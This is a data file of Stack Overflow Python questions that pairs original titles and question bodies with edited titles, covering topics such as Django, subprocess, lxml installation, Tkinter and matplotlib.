"""Best"" way to integrate Django with an Ajax"," Obviously, horses for courses, but what are some good ways to integrate javascript libraries with one's Django application?I'm planning on using jQuery, mostly because it seems popular and looks powerful (but I'm open to other suggestions).Are there python-side libraries that are very helpful or essential? Or is it best simply to create JSON views, and hand-code the javascript (using an appropriate javascript framework)?I've looked (briefly) at Dajax, but based on the scant documentation, it's not clear that it really gives me very much. I would certainly prefer something with a bit more documentation.Other answers here suggest that pjax doesn't necessarily work well with many browsers, so that's out.Edit: Thanks everyone. I'll be looking at tastypie to simplify exposing some json views, and man up to write some javascript by hand (Which having done a tiny bit earlier this year, seems much better than it was in the late 90s). <code> ","""Best"" way to integrate Django with an Ajax library"
Display a list of user defined functions in the Python IDLE environment," Is it possible to display a list of all user functions in the IDLE session?I can see them popping up in the autocomplete, so maybe there is other way to just display only the user functions defined for the session. It is useful when you forget the name of the function. And also when you want to make sure that you don't lose source code for a function when a session is closed. <code> ",Display a list of user defined functions in the Python IDLE session
Are lists thread-safe," I notice that it is often suggested to use queues with multiple threads, instead of lists and .pop(). Is this because lists are not thread-safe, or for some other reason? <code> ",Are lists thread-safe?
Python - Iterating through list," I want to iterate through list of list.I want to iterate through irregularly nested lists inside list also.Can anyone let me know how can I do that? <code>  x = [u'sam', [['Test', [['one', [], []]], [(u'file.txt', ['id', 1, 0])]], ['Test2', [], [(u'file2.txt', ['id', 1, 2])]]], []]",Iterating through list of list in Python
Python - Iterating through list of list," I want to iterate through list of list.I want to iterate through irregularly nested lists inside list also.Can anyone let me know how can I do that? <code>  x = [u'sam', [['Test', [['one', [], []]], [(u'file.txt', ['id', 1, 0])]], ['Test2', [], [(u'file2.txt', ['id', 1, 2])]]], []]",Iterating through list of list in Python
Python: How to read stdout from an other process while it is running?," During the runtime of a process I would like to read its stdout and write it to a file. Any attempt of mine however failed because no matter what I tried as soon as I tried reading from the stdout it blocked until the process finished.Here is a snippet of what I am trying to do. (The first part is simply a python script that writes something to stdout.) I know that there are multiple questions out there that deal with the same subject. However, none of the ones I found was able to answer my question. <code>  import subprocessp = subprocess.Popen('python -c \'\from time import sleep\n\for i in range(3):\n\ sleep(1)\n\ print ""Hello"", i\\'', shell = True, stdout = subprocess.PIPE)while p.poll() == None: #read the stdout continuously passprint ""Done""",Python: How to read stdout non blocking from another process?
Python: How to read stdout non blocking from an other process?," During the runtime of a process I would like to read its stdout and write it to a file. Any attempt of mine however failed because no matter what I tried as soon as I tried reading from the stdout it blocked until the process finished.Here is a snippet of what I am trying to do. (The first part is simply a python script that writes something to stdout.) I know that there are multiple questions out there that deal with the same subject. However, none of the ones I found was able to answer my question. <code>  import subprocessp = subprocess.Popen('python -c \'\from time import sleep\n\for i in range(3):\n\ sleep(1)\n\ print ""Hello"", i\\'', shell = True, stdout = subprocess.PIPE)while p.poll() == None: #read the stdout continuously passprint ""Done""",Python: How to read stdout non blocking from another process?
Python add new item to dictionary," I want to add an item to an existing dictionary in Python. For example, this is my dictionary: I want to add a new item such that: How can I achieve this? <code>  default_data = { 'item1': 1, 'item2': 2,} default_data = default_data + {'item3':3}",Add a new item to a dictionary in Python
what is return of os.system() in python?, I came across this: What is return value of os.system()? Why I get 0? <code>  >>> import os>>> os.system('ls')file.txt README0,What is the return value of os.system() in Python?
Catch multiple exceptions in one line," I know that I can do: I can also do this: But if I want to do the same thing inside two different exceptions, the best I can think of right now is to do this: Is there any way that I can do something like this (since the action to take in both exceptions is to say please): Now this really won't work, as it matches the syntax for: So, my effort to catch the two distinct exceptions doesn't exactly come through.Is there a way to do this? <code>  try: # do something that may failexcept: # do this if ANYTHING goes wrong try: # do something that may failexcept IDontLikeYouException: # say pleaseexcept YouAreTooShortException: # stand on a ladder try: # do something that may failexcept IDontLikeYouException: # say pleaseexcept YouAreBeingMeanException: # say please try: # do something that may failexcept IDontLikeYouException, YouAreBeingMeanException: # say please try: # do something that may failexcept Exception, e: # say please",Catch multiple exceptions in one line (except block)
Python split consecutive delimiters," The default split method in Python treats consecutive spaces as a single delimiter. But if you specify a delimiter string, consecutive delimiters are not collapsed: What is the most straightforward way to collapse consecutive delimiters? I know I could just remove empty strings from the result list: But is there a more convenient way? <code>  >>> 'aaa'.split('a')['', '', '', ''] >>> result = 'aaa'.split('a')>>> result['', '', '', '']>>> result = [item for item in result if item]",How to collapse consecutive delimiters?
How to install lxml with easy_install?," I'm having difficulty installing lxml with easy_install on Ubuntu 11.When I type $ easy_install lxml I get: It seems that libxslt or libxml2 is not installed. I've tried following the instructions at http://www.techsww.com/tutorials/libraries/libxslt/installation/installing_libxslt_on_ubuntu_linux.php and http://www.techsww.com/tutorials/libraries/libxml/installation/installing_libxml_on_ubuntu_linux.php with no success.If I try wget ftp://xmlsoft.org/libxml2/libxml2-sources-2.6.27.tar.gz I get If I try the other first, I'll get to ./configure --prefix=/usr/local/libxslt --with-libxml-prefix=/usr/local/libxml2 and that will fail eventually with: I've tried both versions 2.6.27 and 2.6.29 of libxml2 with no difference.Leaving no stone unturned, I have successfully done sudo apt-get install libxml2-dev, but this changes nothing. <code>  Searching for lxmlReading http://pypi.python.org/simple/lxml/Reading http://codespeak.net/lxmlBest match: lxml 2.3Downloading http://lxml.de/files/lxml-2.3.tgzProcessing lxml-2.3.tgzRunning lxml-2.3/setup.py -q bdist_egg --dist-dir /tmp/easy_install-7UdQOZ/lxml-2.3/egg-dist-tmp-GacQGyBuilding lxml version 2.3.Building without Cython.ERROR: /bin/sh: xslt-config: not found** make sure the development packages of libxml2 and libxslt are installed **Using build configuration of libxslt In file included from src/lxml/lxml.etree.c:227:0:src/lxml/etree_defs.h:9:31: fatal error: libxml/xmlversion.h: No such file or directorycompilation terminated. <successful connection info>==> SYST ... done. ==> PWD ... done.==> TYPE I ... done. ==> CWD (1) /libxml2 ... done.==> SIZE libxml2-sources-2.6.27.tar.gz ... done.==> PASV ... done. ==> RETR libxml2-sources-2.6.27.tar.gz ... No such file `libxml2-sources-2.6.27.tar.gz'. checking for libxml libraries >= 2.6.27... configure: error: Could not find libxml2 anywhere, check ftp://xmlsoft.org/.",How to install lxml on Ubuntu
Cleare all item from the queue," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
Clear all items from the queue," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
Clear all items from the queue ," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
dict literal vs dict constructor - any preferred?," Using PyCharm, I noticed it offers to convert a dict literal: into a dict constructor: Do these different approaches differ in some significant way?(While writing this question I noticed that using dict() it seems impossible to specify a numeric key .. d = {1: 'one', 2: 'two'} is possible, but, obviously, dict(1='one' ...) is not. Anything else?) <code>  d = { 'one': '1', 'two': '2',} d = dict(one='1', two='2')",Is there a difference between using a dict literal and a dict constructor?
Python Right Click Menu Using PyGTK," So I'm still fairly new to Python, and have been learning for a couple months, but one thing I'm trying to figure out is say you have a basic window... I wanna right click inside this window, and have a menu pop up like alert, copy, exit, whatever I feel like putting down.How would I accomplish that? <code>  #!/usr/bin/env pythonimport sys, osimport pygtk, gtk, gobjectclass app: def __init__(self): window = gtk.Window(gtk.WINDOW_TOPLEVEL) window.set_title(""TestApp"") window.set_default_size(320, 240) window.connect(""destroy"", gtk.main_quit) window.show_all()app()gtk.main()",Right Click Menu (context menu) using PyGTK
import python modules with the same name," I have several Python projects and they all have a conf package: For each project, I have created a .pth file in the site-packages folder with this contents: I can access modules in /some_folder/project_1/: but not the modules in /another_folder/project_2/: It looks as if python only searches the first conf path underneath any folders in sys.path. Is there a way to fix that? <code>  /some_folder/project_1/ conf/ __init__.py some_source_file.py/another_folder/project_2/ conf/ __init__.py another_source_file.py .../site-packages/project_1.pth:import sys; sys.path.append('/some_folder/project_1/').../site-packages/project_2.pth:import sys; sys.path.append('/another_folder/project_2/') import conf.some_source_file import conf.another_source_fileAttributeError: 'module' object has no attribute 'another_source_file'",Import Python modules with the same name
Using exponentiation ** less effcient than math.sqrt?," A quote from ""Python Programming: An Introduction to Computer Science"" We could have taken the square root using exponentiation **. Using math.sqrt is somewhat more efficient.""Somewhat"", but to what extent, and how? <code> ",Using exponentiation **0.5 less efficient than math.sqrt?
Using exponentiation ** less efficient than math.sqrt?," A quote from ""Python Programming: An Introduction to Computer Science"" We could have taken the square root using exponentiation **. Using math.sqrt is somewhat more efficient.""Somewhat"", but to what extent, and how? <code> ",Using exponentiation **0.5 less efficient than math.sqrt?
Python: Convert an iterable to a stream?," If I've got an iterable containing strings, is there a simple way to turn it into a stream? I want to do something like this: <code>  def make_file(): yield ""hello\n"" yield ""world\n""output = tarfile.TarFile()stream = iterable_to_stream(make_file())output.addfile(, stream)",How to convert an iterable to a stream?
Python - Are there more search paths than in sys.path?," I thought that the sys.path was a complete list of all search paths for Python modules.However, on my Ubuntu machine, '/usr/local/lib/python2.6/dist-packages/' is where almost all my modules are and that path is not in sys.path. And I can still import any module on that path. EDIT, NOT TRUE: Even if I set the sys.path to the empty list, I can still import from that path. Where does this implicit knowledge of the dist-packages path come from? And are there any other paths in this implicit group of search paths, or whatever it is?EDIT: It seems like the second part of my post is not true. Indeed, ""sys.path = []"", will mean that I can not import anything, not even from my current working directory. My apologies.  <code> ",Are there more search paths than in sys.path?
Python - detect charset and convert to utf-8, Is there any universal method to detect string charset? I user IPTC tags and have no known encoding. I need to detect it and then change them to utf-8.Anybody can help? <code> ,Detect charset and convert to utf-8 in Python?
How to call a python function from an another file," I have this class in my parser.py file after that it defined a function which trying to find an host id from a xml file Now i want to use call this get_id function from an another file.I tried so many time but it shows an error i.e. module can't be import <code>  class HostInfo(object):def __init__(self, host_id): self.osclass = [] self.osmatch = [] self.osfingerprint = [] self.portused = [] self.ports = [] self.extraports = [] self.tcpsequence = {} self.hostnames = [] self.tcptssequence = {} self.ipidsequence = {} self.trace = {'port': '', 'proto': '', 'hop': []} self.status = {} self.address = [] self.hostscript = [] # Umit extension self.id = host_id self.comment = '' # XXX this structure it not being used yet. self.nmap_host = { 'status': {'state': '', 'reason': ''}, 'smurf': {'responses': ''}, 'times': {'to': '', 'srtt': '', 'rttvar': ''}, 'hostscript': [], 'distance': {'value': ''}, 'trace': {'port': '', 'proto': '', 'hop': []}, 'address': [], 'hostnames': [], 'ports': [], 'uptime': {'seconds': '', 'lastboot': ''}, 'tcpsequence': {'index': '', 'values': '', 'class': ''}, 'tcptssequence': {'values': '', 'class': ''}, 'ipidsequence': {'values': '', 'class': ''}, 'os': {} } def get_id(self): try: return self._id except AttributeError: raise Exception(""Id is not set yet."")def set_id(self, host_id): try: self._id = int(host_id) except (TypeError, ValueError): raise Exception(""Invalid id! It must represent an integer, "" ""received %r"" % host_id)",How to call a python class function from another file
How to call a python function from another file," I have this class in my parser.py file after that it defined a function which trying to find an host id from a xml file Now i want to use call this get_id function from an another file.I tried so many time but it shows an error i.e. module can't be import <code>  class HostInfo(object):def __init__(self, host_id): self.osclass = [] self.osmatch = [] self.osfingerprint = [] self.portused = [] self.ports = [] self.extraports = [] self.tcpsequence = {} self.hostnames = [] self.tcptssequence = {} self.ipidsequence = {} self.trace = {'port': '', 'proto': '', 'hop': []} self.status = {} self.address = [] self.hostscript = [] # Umit extension self.id = host_id self.comment = '' # XXX this structure it not being used yet. self.nmap_host = { 'status': {'state': '', 'reason': ''}, 'smurf': {'responses': ''}, 'times': {'to': '', 'srtt': '', 'rttvar': ''}, 'hostscript': [], 'distance': {'value': ''}, 'trace': {'port': '', 'proto': '', 'hop': []}, 'address': [], 'hostnames': [], 'ports': [], 'uptime': {'seconds': '', 'lastboot': ''}, 'tcpsequence': {'index': '', 'values': '', 'class': ''}, 'tcptssequence': {'values': '', 'class': ''}, 'ipidsequence': {'values': '', 'class': ''}, 'os': {} } def get_id(self): try: return self._id except AttributeError: raise Exception(""Id is not set yet."")def set_id(self, host_id): try: self._id = int(host_id) except (TypeError, ValueError): raise Exception(""Invalid id! It must represent an integer, "" ""received %r"" % host_id)",How to call a python class function from another file
filtering sqlalchemy database by id, I need to query a SQLAlchemy database by its id something similar to User.query.filter_by(username='peter')but for id. How do I do this? [Searching over Google and SO didn't help] <code> ,How to query database by id using SqlAlchemy?
Efficient item binning algorithm (itertools/numpy)," I think this is a common combinatorics problem, but I can't seem to find a name for it or any material about it. I am doing this in Python and numpy, but if there is a fast matrix method for this, I can probably translate.Basically, given n items, I need to generate all ways to put them in m bins. As an example, binning 4 items into 3 bins would give something like [(4, 0, 0), (3, 1, 0), (3, 0, 1), (2, 2, 0), (2, 1, 1), ...]. This is a product with a fixed total.Implementing this with itertools is straightforward. Unfortunately, I think doing subsequent calculations in loops will be inefficient. Working with this as a 2D numpy array would be faster later on, but I can't figure out an efficient way to build an array with this. I could iterate over the ifilter result, building a list of the possibilities, and use this to construct the array, but that seems like a huge waste.I'm guessing the best way to do this is to build everything ""the numpy way"", but I'm not sure how to do this. There is a speedy product implementation on stackoverflow: Using numpy to build an array of all combinations of two arrays. I'm guessing you can modify this only to output products with the right sum. The size of the array should be ((m-1) + n) choose n, since there are m-1 bin boundaries.Any ideas? Benchmarks much appreciated, but not required. <code>  import itertoolsdef fixed_total_product(bins, num_items):"""""" Return iterator of all item binning possibilities. """"""return itertools.ifilter(lambda combo: sum(combo) == num_items, itertools.product(xrange(num_items + 1), repeat=bins))",Efficient item binning algorithm (itertools/numpy) [Solved]
Python: How to remove all duplicate items from a list," How would I use python to check a list and delete all duplicates? I don't want to have to specify what the duplicate item is - I want the code to figure out if there are any and remove them if so, keeping only one instance of each. It also must work if there are multiple duplicates in a list. For example, in my code below, the list lseparatedOrbList has 12 items - one is repeated six times, one is repeated five times, and there is only one instance of one. I want it to change the list so there are only three items - one of each, and in the same order they appeared before. I tried this: But I get the error: I'm guessing because it's because I'm trying to loop through lseparatedOrbList while I loop through it, but I can't think of another way to do it. <code>  for i in lseparatedOrbList: for j in lseparatedOrblist: if lseparatedOrbList[i] == lseparatedOrbList[j]: lseparatedOrbList.remove(lseparatedOrbList[j]) Traceback (most recent call last): File ""qchemOutputSearch.py"", line 123, in <module> for j in lseparatedOrblist:NameError: name 'lseparatedOrblist' is not defined",How to remove all duplicate items from a list
parsing .xsd in pyton," I need to parse a file .xsd in Python as i would parse an XML.I am using libxml2.I have to parse an xsd that look as follow: when i access with tells me that cannot find the path.while if i remove all the xs: as follow in this way it works Does anyone knows how can i get read of this problem fixing a prefix? righ now i am preparsing the file removing the xs: but it's an orrible solution and i really hope to be able to find a better solution.(I did not try with py-dom-xpath yet and i do not know if may work even with the xs:)thanks,ste <code>  <xs:complexType name=""ClassType""><xs:sequence> <xs:element name=""IeplcHeader""> <xs:complexType> <xs:sequence> <xs:element name=""device-number"" type=""xs:integer"" fixed=""1""/> </xs:sequence> <xs:attribute name=""version"" type=""xs:integer"" use=""required"" fixed=""0""/> </xs:complexType> </xs:element> doc.xpathEval('//xs:complexType/xs:sequence/xs:element[@name=""IeplcHeader""]'): <complexType name=""ClassType""> <sequence> <element name=""IeplcHeader""> <complexType> <sequence> <element name=""device-number"" type=""xs:integer"" fixed=""1""/> </sequence> <attribute name=""version"" type=""xs:integer"" use=""required"" fixed=""0""/> </complexType> </element> doc.xpathEval('//complexType/sequence/element[@name=""IeplcHeader""]'):",parsing .xsd in python
"How can i use the unique(a, 'rows') from MATLab at python?"," I'm translating some stuff from MATLAB to the Python language.There's this command, unique(a), in NumPy. But since the MATLAB program runs the 'rows' command also, it gives something a little different.Is there a similar command in Python or should I make some algorithm that does the same thing? <code> ","How can I use the unique(a, 'rows') from MATLAB in Python?"
"(python) how to run "" ps cax | grep something "" in python?"," How do I run a command with a pipe | in it?The subprocess module seems complex...Is there something like as in shell script? <code>  output,error = `ps cax | grep something`","How to run "" ps cax | grep something "" in Python?"
"batch equivalent of ""source"" on windows: how to run a python script from a virtualenv"," I've done a fair bit of bash scripting, but very little batch scripting on Windows. I'm trying to activate a Python virtualenv, run a Python script, then deactivate the virtualenv when the script exits.I've got a folder called env, which is my virtualenv, and a folder called work, which contains my scripts.This is what I've got so far: However, when I run the script, it activates the virtualenv then stops. It does not get to the second line and run the Python script. Is there a way to ""source"" the activate script folder, so that the rest of the batch script can be run as if I'd called activate.bat from the command line? <code>  %~dp0env\Scripts\activate.batpython %~dp0work\script.pydeactivate","Batch equivalent of ""source"" on Windows: how to run a Python script from a virtualenv"
"Python, how to ready bytes from file and save it?"," I want to read bytes from a file and then write those bytes to another file, and save that file.How do I do this? <code> ","Python, how to read bytes from file and save it?"
"In C++, the language provides macros __FILE__, __FUNCTION__, __LINE__. How does python do this?"," In C++, I can print debug output like this: How can I do something similar in Python? <code>  printf( ""FILE: %s, FUNC: %s, LINE: %d, LOG: %s\n"", __FILE__, __FUNCTION__, __LINE__, logmessage);","How to determine file, function and line number?"
Change a django form field to a hidden field," I have a Django form with a RegexField, which is very similar to a normal text input field.In my view, under certain conditions I want to hide it from the user, and trying to keep the form as similar as possible. What's the best way to turn this field into a HiddenInput field?I know I can set attributes on the field with: And I can set the desired initial value with: However, that won't change the form of the widget.What's the best / most ""django-y"" / least ""hacky"" way to make this field a <input type=""hidden""> field? <code>  form['fieldname'].field.widget.attr['readonly'] = 'readonly' form.initial['fieldname'] = 'mydesiredvalue'",Change a Django form field to a hidden field
Plot two histograms at the same time with matplotlib," I created a histogram plot using data from a file and no problem. Now I wanted to superpose data from another file in the same histogram, so I do something like this but the problem is that for each interval, only the bar with the highest value appears, and the other is hidden. I wonder how could I plot both histograms at the same time with different colors. <code>  n,bins,patchs = ax.hist(mydata1,100)n,bins,patchs = ax.hist(mydata2,100)",Plot two histograms on single chart with matplotlib
passing argument in python Tkinter button command," Suppose I have the following Button made with Tkinter in Python: The method action is called when I press the button, but what if I wanted to pass some arguments to the method action?I have tried with the following code: This just invokes the method immediately, and pressing the button does nothing. <code>  import Tkinter as Tkwin = Tk.Toplevel()frame = Tk.Frame(master=win).grid(row=1, column=1)button = Tk.Button(master=frame, text='press', command=action) button = Tk.Button(master=frame, text='press', command=action(someNumber))",How to pass arguments to a Button command in Tkinter?
How to pass arguments to a Button command in Tkinter?," Suppose I have the following Button made with Tkinter in Python: The method action is called when I press the button, but what if I wanted to pass some arguments to the method action?I have tried with the following code: This just invokes the method immediately, and pressing the button does nothing. <code>  import Tkinter as Tkwin = Tk.Toplevel()frame = Tk.Frame(master=win).grid(row=1, column=1)button = Tk.Button(master=frame, text='press', command=action) button = Tk.Button(master=frame, text='press', command=action(someNumber))",How to pass arguments to a Button command in Tkinter?
How to pass arguments to a Button command in Tkinter (Python)?," Suppose I have the following Button made with Tkinter in Python: The method action is called when I press the button, but what if I wanted to pass some arguments to the method action?I have tried with the following code: This just invokes the method immediately, and pressing the button does nothing. <code>  import Tkinter as Tkwin = Tk.Toplevel()frame = Tk.Frame(master=win).grid(row=1, column=1)button = Tk.Button(master=frame, text='press', command=action) button = Tk.Button(master=frame, text='press', command=action(someNumber))",How to pass arguments to a Button command in Tkinter?
pyaudio help play a file," I do not understand the example material for pyaudio. It seems they had written an entire small program and it threw me off. How do I just play a single audio file? Format is not an issue, I just want to know the bare minimum code I need to play an audio file. <code> ",How to play an audiofile with pyaudio?
Python - find the item with maximum occurrences," In Python, I have a list: I want to identify the item that occurred the highest number of times. I am able to solve it but I need the fastest way to do so. I know there is a nice Pythonic answer to this.  <code>  L = [1, 2, 45, 55, 5, 4, 4, 4, 4, 4, 4, 5456, 56, 6, 7, 67] ",Find the item with maximum occurrences in a list
Python- find the item with maximum occurrences in a list," In Python, I have a list: I want to identify the item that occurred the highest number of times. I am able to solve it but I need the fastest way to do so. I know there is a nice Pythonic answer to this.  <code>  L = [1, 2, 45, 55, 5, 4, 4, 4, 4, 4, 4, 5456, 56, 6, 7, 67] ",Find the item with maximum occurrences in a list
A list of useful python commands for Vim?," I was looking for a quick way to autoformat/pretty-print JSON in Vim the other day and found this great little command on Stack Overflow: :%!python -m json.toolThat sent me on a search for a list of other Python tools to pretty-print common web files, but I couldn't find much. Is there a good resource/list of Python tools that they find particularly useful for cleaning up poorly formatted web stuff inside Vim (e.g. HTML, XML, JavaScript, etc.)? <code> ",A list of useful Python commands for Vim?
Passing json data to the front end using django," Is there a way to pass JSON objects to the front end of a web template if using the Django framework or Python in general?For example, if I want to send an object that has two arrays as properties (let's say xvalues and yvalues), how would I be able to use JavaScript or jQuery to do an Ajax call to obtain the object that has the properties? <code> ",Passing JSON data to the front end using Django
How to retrieve author of a office file in python?," Title explains the problem, there are doc and docs files that which I want to retrieive their author information so that I can restructure my files.os.stat returns only size and datetime, real-file related information.open(filename, 'rb').read(200) returns many characters that I could not parse.There is a module called xlrd for reading xlsx files. Yet, this still doesn't let me read doc or docx files. I am aware of new office files are not easily read on non-msoffice programs, so if that's impossible, gathering info from old office files would suffice. <code> ",How to retrieve the author of an office file in python?
how to access elements in a 2D array?," I would like to understand how one goes about manipulating the elements of a 2D array.If I have for example: I have defined them in python as for example: I saw that I cannot refer to a[1][1] but to a[1] which gives me a result of [2,1].So, I don't understand how do I access the second row of these arrays? That would be a21, a22, a23, b21, b22, b23?And how would I do in order to multiply them as c1 = a21*b21, c2 = a22*b22, etc ? <code>  a= ( a11 a12 a13 ) and b = (b11 b12 b13) a21 a22 a23 b21 b22 b23 a=[[1,1],[2,1],[3,1]]b=[[1,2],[2,2],[3,2]]",How to access the elements of a 2D array?
This application does not exist (app_id=xxx," I was unable to upload to an AppEngine as appcfg was telling me : This application does not exist (app_id=u'xxx').I was only a developer on the AppEngine, so as I was just testing I created a new AppEngine where I was the owner but I still get the same message on a newly created AppEngine. <code> ",This application does not exist (app_id=xxx)
Want to add line of text to the top of each Python file in current and sub directories," I'm on an Ubuntu platform and have a directory containing many .py files and subdirectories (also containing .py files). I would like to add a line of text to the top of each .py file. What's the easiest way to do that using Perl, Python, or shell script? <code> ",Add line on top of each Python file in current and sub directories
How do I add line of text to top of each Python file in current and sub directories?," I'm on an Ubuntu platform and have a directory containing many .py files and subdirectories (also containing .py files). I would like to add a line of text to the top of each .py file. What's the easiest way to do that using Perl, Python, or shell script? <code> ",Add line on top of each Python file in current and sub directories
python timedelta behaviour on subtraction," This question originated when I came upon (another thread) about Python's datetime and timedelta objects.I followed the update by jimgardener and read the comments by eyquem ,and tried out some python code ..I am having a bad time understanding the way things work here(due to my newbie to python status)..I thought it was proper to ask a new question printing these variables yielded When I looked at these results,I noticed that now , when tdiff is examined,I found that this is the same as duration between t1(23:30:00 PM) and t2(00:15:30 AM) assuming that t2 follows t1My question is,since td1 is the duration from previous midnightto 23:30:00 PM and td2 is the duration from that midnightto 00:15:30 AM , how can their difference represent the duration between t2 and t1 ?Can some python gurus explain <code>  import datetime#for t1=23:30:00 PMt1 = datetime.time(23,30,00)#for t1=00:15:30 AMt2 = datetime.time(0,15,30)td1 = datetime.timedelta(hours=t1.hour,minutes = t1.minute,seconds=t1.second)td2 = datetime.timedelta(hours=t2.hour,minutes = t2.minute,seconds=t2.second)#substarcting timedeltastdiff = td2-td1 td1 ==> datetime.timedelta(0, 84600)td1.seconds ==> 84600td2 ==> datetime.timedelta(0, 930)td2.seconds ==> 930tdiff ==> datetime.timedelta(-1, 2730) td1.seconds (ie 84600) is equivalent to 84600/60 ==> 1410 minutes1410/60 ==> 23.5 hoursor in short,td1 represents the duration **from previous midnight** to 23:30 PM td2.seconds (ie 930) is equivalent to930/60 ==> 15.5 minutes or 15 minutes and 30 secondswhich means td2 represents the duration from **that midnight** to 00:15:30 AM tdiff ==> timedelta(-1,2730)tdiff.seconds ==> 2730tdiff.seconds/60 ==>45 minutes",Python timedelta behaviour on subtraction
How to merge nested lists," I have a set of nested tuples: I would like to combine lists with similar prefixes, resulting in: Here is another example: would be merged to: These are intended to store paths from the root to the tree leaves:'baz' -> 'bing' -> 'fizz', aka. ('baz' ('bing' ('fizz,)))'baz' -> 'zap' -> 'zang', aka ('baz' ('zap', ('zang',)))'baz' -> 'bing' -> 'frazz' -> 'blop', aka ('baz', ('bing', ('frazz', ('blop,)))) I want to merge the elements where the leaves are reached by the same path. I hope this provides some amount of clarification.I've written some code to do this, but it is ugly, verbose, and probably fragile. Is there some generic, concise, and/or efficient way of doing this? I imagine there may be some sort of itertools magic that I don't know about which would provide some elegant solution.Note: I'm using python 2.4 <code>  ('id', ('name', ('name_float_fml',)), ('user', ('email',)), ('user', ('last_login',))) ('id', ('name', ('name_float_fml',)), ('user', ('email','last_login'))) (('baz', ('bing', ('fizz', 'frozz', ('frazz', ('fry', 'bleep', 'blop'))))), ('baz', ('zap', ('zang',))), 'foo', 'bar') (('baz', (('bing', ('fizz', 'frozz', ('frazz', ('fry', 'bleep', 'blop')))), ('zap', ('zang')))), 'foo', 'bar')",How to merge nested tuples
How do I resolve a python memory leak associated with a django-celery task that relies on numpy and matplotlib?," I have several matlpotlib functions rolled into some django-celery tasks.Every time the tasks are called more RAM is dedicated to python. Before too long, python is taking up all of the RAM.QUESTION: How can I release this memory?UPDATE 2 - A Second Solution:I asked a similar question specifically about the memory locked up when matplotlib errors, but I got a good answer to this question .clf(), .close(), and gc.collect() aren't needed if you use multiprocess to run the plotting function in a separate process whose memory will automatically be freed once the process ends.Matplotlib errors result in a memory leak. How can I free up that memory?UPDATE - The Solution:These stackoverflow posts suggested that I can release the memory used by matplotlib objects with the following commands:.clf(): Matplotlib runs out of memory when plotting in a loop.close(): Python matplotlib: memory not being released when specifying figure size Here is the example I used to test the solution: <code>  import gcgc.collect() import matplotlibmatplotlib.use('Agg')import matplotlib.pyplot as pltfrom pylab import import figure, savefigimport numpy as npimport gc a = np.arange(1000000)b = np.random.randn(1000000)fig = plt.figure(num=1, dpi=100, facecolor='w', edgecolor='w')fig.set_size_inches(10,7)ax = fig.add_subplot(111)ax.plot(a, b)fig.clf()plt.close()del a, bgc.collect()",How can I release memory after creating matplotlib figures
"Is ""with"" monadic?"," Like many a foolhardy pioneer before me, I'm endeavoring to cross the trackless wasteland that is Understanding Monads.I'm still staggering through, but I can't help noticing a certain monad-like quality about Python's with statement. Consider this fragment: Consider the open() call as the ""unit"" and the block itself as the ""bind"". The actual monad isn't exposed (uh, unless f is the monad), but the pattern is there. Isn't it? Or am I just mistaking all of FP for monadry? Or is it just 3 in the morning and anything seems plausible?A related question: if we have monads, do we need exceptions?In the above fragment, any failure in the I/O can be hidden from the code. Disk corruption, the absence of the named file, and an empty file can all be treated the same. So no need for a visible IO Exception.Certainly, Scala's Option typeclass has eliminated the dreaded Null Pointer Exception. If you rethought numbers as Monads (with NaN and DivideByZero as the special cases)...Like I said, 3 in the morning. <code>  with open(input_filename, 'r') as f: for line in f: process(line)","Is Python's ""with"" monadic?"
building full path filename in python," I need to pass a file path name to a module. How do I build the file path from a directory name, base filename, and a file format string?The directory may or may not exist at the time of call.For example: I need to create a string '/home/me/dev/my_reports/daily_report.pdf' Concatenating the pieces manually doesn't seem to be a good way. I tried os.path.join: but it gives <code>  dir_name='/home/me/dev/my_reports'base_filename='daily_report'format = 'pdf' join(dir_name,base_filename,format) /home/me/dev/my_reports/daily_report/pdf",Build the full path filename in Python
"building full path filename in python,"," I need to pass a file path name to a module. How do I build the file path from a directory name, base filename, and a file format string?The directory may or may not exist at the time of call.For example: I need to create a string '/home/me/dev/my_reports/daily_report.pdf' Concatenating the pieces manually doesn't seem to be a good way. I tried os.path.join: but it gives <code>  dir_name='/home/me/dev/my_reports'base_filename='daily_report'format = 'pdf' join(dir_name,base_filename,format) /home/me/dev/my_reports/daily_report/pdf",Build the full path filename in Python
Django in 2011?," I am asking this question because I am a beginner and I've read almost 90% of articles speaking about Django, but the problem is:Django was made and had problems for deploying, it is python, and python is not PHP!When reading Django tutorials, a beginner is in big problem, because he can find a tutorial ""outdated"" for example if you take a tutorial made in 2008 you'll see that they speak like the following: to deploy django, use apache, and dont forget to use another server for static files, for example nginx as a reverse proxy!But now, I found some articles saying that making a second server is useless because in the past, Django was served using mod_python which uses a lot of resources! So here is my question:Which one is the best for VPS, Apache or Nginx, using the latest release of course! Please dont say: use lighty or cherokee... If, for example, the answer was: use Ngnix, then, is it better to use one server or two, as in the past it was better to make two webservers? When I've checked my brain, I've found that there is only few free space avalaible, so I don't want to learn something else, so do you think a 100% pythonic solution will be ok? CherryPy does it be a perfect solution, mean, CherryPy + Django and basta! no Apache, no Nginx, no more learning than python language!From what I've read, Django and asynchronous servers are not ""good friends"", so does really get a good choise to use Nginx?Updated: added (4) about Django and asynchronous.  <code> ",Which webserver to use with Django? (updated for use in 2011)
Which webserver to use with Django?," I am asking this question because I am a beginner and I've read almost 90% of articles speaking about Django, but the problem is:Django was made and had problems for deploying, it is python, and python is not PHP!When reading Django tutorials, a beginner is in big problem, because he can find a tutorial ""outdated"" for example if you take a tutorial made in 2008 you'll see that they speak like the following: to deploy django, use apache, and dont forget to use another server for static files, for example nginx as a reverse proxy!But now, I found some articles saying that making a second server is useless because in the past, Django was served using mod_python which uses a lot of resources! So here is my question:Which one is the best for VPS, Apache or Nginx, using the latest release of course! Please dont say: use lighty or cherokee... If, for example, the answer was: use Ngnix, then, is it better to use one server or two, as in the past it was better to make two webservers? When I've checked my brain, I've found that there is only few free space avalaible, so I don't want to learn something else, so do you think a 100% pythonic solution will be ok? CherryPy does it be a perfect solution, mean, CherryPy + Django and basta! no Apache, no Nginx, no more learning than python language!From what I've read, Django and asynchronous servers are not ""good friends"", so does really get a good choise to use Nginx?Updated: added (4) about Django and asynchronous.  <code> ",Which webserver to use with Django? (updated for use in 2011)
